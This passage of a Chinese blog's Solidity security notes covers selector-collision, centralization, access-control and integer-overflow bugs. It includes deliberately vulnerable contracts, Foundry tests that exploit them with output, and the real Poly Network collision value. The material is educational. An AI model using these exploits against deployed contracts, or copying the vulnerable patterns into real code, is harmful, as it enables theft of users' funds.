+<h2 id="0xAA-解决斯芬克斯之谜"><a href="#0xAA-解决斯芬克斯之谜" class="headerlink" title="0xAA 解决斯芬克斯之谜"></a><code>0xAA</code> 解决斯芬克斯之谜</h2><p>以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器<code>0x10cd2dc7</code>来验证答案是否正确。</p>
+<p>有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function man()&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。</p>
+<p>那一天下午，<code>0xAA</code>路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function peopleLduohW(uint256)&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。</p>
+<p><img src="/img/web3/S02-2.png" srcset="/img/loading.gif" lazyload alt="S02-2"></p>
+<h2 id="漏洞合约例子-1"><a href="#漏洞合约例子-1" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><p>下面我们来看一下有漏洞的合约例子。<code>SelectorClash</code>合约有<code>1</code>个状态变量 <code>solved</code>，初始化为<code>false</code>，攻击者需要将它改为<code>true</code>。合约主要有<code>2</code>个函数，函数名沿用自 Poly Network 漏洞合约。</p>
+<ol>
+<li><code>putCurEpochConPubKeyBytes()</code> ：攻击者调用这个函数后，就可以将<code>solved</code>改为<code>true</code>，完成攻击。但是这个函数检查<code>msg.sender == address(this)</code>，因此调用者必须为合约本身，我们需要看下其他函数。</li>
+<li><code>executeCrossChainTx()</code> ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为<code>(bytes)</code>，而这里调用的函数参数为<code>(bytes,bytes,uint64)</code>。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;<br><br>contract SelectorClash &#123;<br>    bool public solved; // 攻击是否成功<br><br>    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。<br>    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;<br>        require(msg.sender == address(this), &quot;Not Owner&quot;);<br>        solved = true;<br>    &#125;<br><br>    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。<br>    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;<br>        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>我们的目标是利用<code>executeCrossChainTx()</code>函数调用合约中的<code>putCurEpochConPubKeyBytes()</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx()</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器。因此，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数。</p>
+<p>Poly Network黑客事件中，黑客碰撞出的<code>_method</code>为 <code>f1121318093</code>，即<code>f1121318093(bytes,bytes,uint64)</code>的哈希前<code>4</code>位也是<code>0x41973cd9</code>，可以成功的调用函数。接下来我们要做的就是将<code>f1121318093</code>转换为<code>bytes</code>类型：<code>0x6631313231333138303933</code>，然后作为参数输入到<code>executeCrossChainTx()</code>中。<code>executeCrossChainTx()</code>函数另<code>3</code>个参数不重要，填 <code>0x</code>, <code>0x</code>, <code>0</code> 就可以。</p>
+<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="&#96;&#96;演示"></a>&#96;&#96;演示</h2><ol>
+<li>部署<code>SelectorClash</code>合约。</li>
+<li>调用<code>executeCrossChainTx()</code>，参数填<code>0x6631313231333138303933</code>，<code>0x</code>，<code>0x</code>，<code>0</code>，发起攻击。</li>
+<li>查看<code>solved</code>变量的值，被修改为<code>true</code>，攻击成功。</li>
+</ol>
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SelectorClashTest is Test &#123;<br>    SelectorClash private selector;<br>    function setUp() public &#123;<br>        selector = new SelectorClash();<br>    &#125;<br>    function test_selector() public &#123;<br>        bool Before=selector.solved();<br>        console.log(&quot;selector.solved Before is  &quot;,Before);<br>        bytes memory _method=&quot;0x6631313231333138303933&quot;;<br><br>        bool success = selector.executeCrossChainTx(<br>            hex&quot;6631313231333138303933&quot;, // bytes param1<br>            &quot;&quot;,                         // bytes param2<br>            &quot;&quot;,                         // bytes param3<br>            0                           // uint256 param4<br>        );<br>        bool After=selector.solved();<br>        console.log(&quot;selector.solved After is  &quot;,After);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>Logs:<br>  selector.solved Before is   false<br>  selector.solved After is   true<br><br>Traces:<br>  [41344] SelectorClashTest::test_selector()<br>    ├─ [2487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] false<br>    ├─ [0] console::log(&quot;selector.solved Before is  &quot;, false) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26267] SelectorClash::executeCrossChainTx(0x6631313231333138303933, 0x, 0x, 0)<br>    │   ├─ [21125] SelectorClash::putCurEpochConPubKeyBytes(0x)<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Return] true<br>    ├─ [487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] true<br>    ├─ [0] console::log(&quot;selector.solved After is  &quot;, true) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="S03-中心化风险"><a href="#S03-中心化风险" class="headerlink" title="S03 中心化风险"></a>S03 中心化风险</h1><p>伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。</p>
+<p>近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在 2022 年 3 月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万 USDC。此外，在 2023 年 8 月 1 日，PEPE 多重签名钱包将阈值从<code>5/8</code>更改为仅<code>2/8</code>，并从多签地址转出大量 PEPE，这也是伪去中心化的体现。</p>
+<p><code>Harmony</code>公链的跨链桥在 2022 年 6 月被盗 1 亿美元。<code>Harmony</code>桥由 5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空</p>
+<h2 id="漏洞合约例子-2"><a href="#漏洞合约例子-2" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>有中心化风险的合约多种多样，这里只举一个最常见的例子：<code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br><br>contract Centralization is ERC20, Ownable &#123;<br>    constructor() ERC20(&quot;Centralization&quot;, &quot;Cent&quot;) &#123;<br>        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;<br>        transferOwnership(exposedAccount);<br>    &#125;<br><br>    function mint(address to, uint256 amount) external onlyOwner&#123;<br>        _mint(to, amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="如何减少中心化-伪去中心化风险？"><a href="#如何减少中心化-伪去中心化风险？" class="headerlink" title="如何减少中心化&#x2F;伪去中心化风险？"></a>如何减少中心化&#x2F;伪去中心化风险？</h2><ol>
+<li>使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4&#x2F;7 或 6&#x2F;9 多签。如果你不了解多签钱包，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/readme.md">WTF Solidity 第 50 讲：多签钱包</a>。</li>
+<li>多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。</li>
+<li>使用时间锁控制合约，在黑客或项目内鬼修改合约参数&#x2F;盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/45_Timelock/readme.md">WTF Solidity 第 45 讲：时间锁</a>。</li>
+</ol>
+<h1 id="S04-权限管理漏洞"><a href="#S04-权限管理漏洞" class="headerlink" title="S04. 权限管理漏洞"></a>S04. 权限管理漏洞</h1><p>智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。</p>
+<p>在下面的代码中，<code>mint()</code>函数没有进行权限管理，那么任何人都可以调用它铸造代币。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的mint函数，没有限制权限<br>function badMint(address to, uint amount) public &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-授权检查错误"><a href="#2-授权检查错误" class="headerlink" title="2. 授权检查错误"></a>2. 授权检查错误</h3><p>另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 <code>burn()</code> 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 <code>BNB</code> 提走，获利 $300,000。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的burn函数，没有限制权限<br>function badBurn(address account, uint amount) public &#123;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>权限管理漏洞主要有两种预防办法：</p>
+<ol>
+<li>使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用<code>OnlyOwner</code>修饰器，只有合约所有者才能调用。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的mint函数，使用 onlyOwner 修饰器限制权限<br>function goodMint(address to, uint amount) public onlyOwner &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>在函数的逻辑中确保合约调用者拥有足够的授权。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的burn函数，如果销毁的不是自己的代币，则会检查授权<br>function goodBurn(address account, uint amount) public &#123;<br>    if(msg.sender != account)&#123;<br>        _spendAllowance(account, msg.sender, amount);<br>    &#125;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="S05-整型溢出"><a href="#S05-整型溢出" class="headerlink" title="S05. 整型溢出"></a>S05. 整型溢出</h1><p>整型溢出漏洞（Arithmetic Over&#x2F;Under Flows）。这是一个比较经典的漏洞，Solidity 0.8版本后内置了Safemath库，因此很少发生</p>
+<p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 <code>uint8</code>，只能表示 [0,255] 范围内的数字。如果给 <code>uint8</code> 类型变量的赋值 <code>257</code>，则会上溢（overflow）变为 <code>1</code>；如果给它赋值<code>-1</code>，则会下溢（underflow）变为<code>255</code>。</p>
+<p>攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为<code>0</code>，他凭空花 <code>$1</code> 之后，余额突然变成了 <code>$2^256-1</code>。2018年的土狗项目 <code>PoWHC</code> 因为这个漏洞被盗了 <code>866 ETH</code>。</p>
+<p><img src="/img/web3/S05-1.png" srcset="/img/loading.gif" lazyload alt="S05-1"></p>
+<h2 id="漏洞合约例子-3"><a href="#漏洞合约例子-3" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面这个例子是一个简单的代币合约，参考了 <code>Ethernaut</code> 中的合约。它有 <code>2</code> 个状态变量：<code>balances</code> 记录了每个地址的余额，<code>totalSupply</code> 记录了代币总供给。</p>
+<p>它有 <code>3</code> 个函数：</p>
+<ul>
+<li>构造函数：初始化代币总供给。</li>
+<li><code>transfer()</code>：转账函数。</li>
+<li><code>balanceOf()</code>：查询余额函数。</li>
+</ul>
+<p>由于solidity <code>0.8.0</code> 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 <code>unchecked</code> 关键字，在代码块中临时关掉溢出检查，就像我们在 <code>transfer()</code> 函数中做的那样。</p>
+<p>这个例子中的漏洞就出现在<code>transfer()</code> 函数中，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>contract Token &#123;<br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br>  <br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    unchecked&#123;<br>        require(balances[msg.sender] - _value &gt;= 0);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>    &#125;<br>    return true;<br>  &#125;<br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TokenTest is Test &#123;<br>    Token private token;<br>    function setUp() public &#123;<br>        uint initialSupply = 100;<br>        token = new Token(initialSupply);<br>    &#125;<br><br>    function test_transfer() public &#123;<br>        uint Before = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf Before is  &quot;, Before);<br>        bool success = token.transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000);<br>        uint After = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf After is  &quot;, After);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="测试结果：变成了一个很大的数字"><a href="#测试结果：变成了一个很大的数字" class="headerlink" title="测试结果：变成了一个很大的数字"></a>测试结果：变成了一个很大的数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  token.balanceOf Before is   100<br>  token.balanceOf After is   115792089237316195423570985008687907853269984665640564039457584007913129639036<br><br>Traces:<br>  [42015] TokenTest::test_transfer()<br>    ├─ [2828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 100<br>    ├─ [0] console::log(&quot;token.balanceOf Before is  &quot;, 100) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26393] Token::transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000)<br>    │   └─ ← [Return] true<br>    ├─ [828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]<br>    ├─ [0] console::log(&quot;token.balanceOf After is  &quot;, 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="预防办法-1"><a href="#预防办法-1" class="headerlink" title="预防办法"></a>预防办法</h2><ol>
+<li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li>
+<li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>08-9Solidity笔记之十合约安全项</div>
+      <div>http://example.com/2025/08/21/08-9Solidity笔记之十合约安全项/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Wangxiaowang</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/14/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B9%9D/" title="08-9Solidity笔记之九闪电贷套利">
+                        <span class="hidden-mobile">08-9Solidity笔记之九闪电贷套利</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"QE69Ypw2FdG2cP7zRWgtj8ii-gzGzoHsz","appKey":"p8TvvzGc2rQ02TfZHuJppQLO","path":"window.location.pathname","placeholder":"欢迎留下评论，嘿嘿！","avatar":"monsterid","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appid":"QE69Ypw2FdG2cP7zRWgtj8ii-gzGzoHsz","appkey":"p8TvvzGc2rQ02TfZHuJppQLO"},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
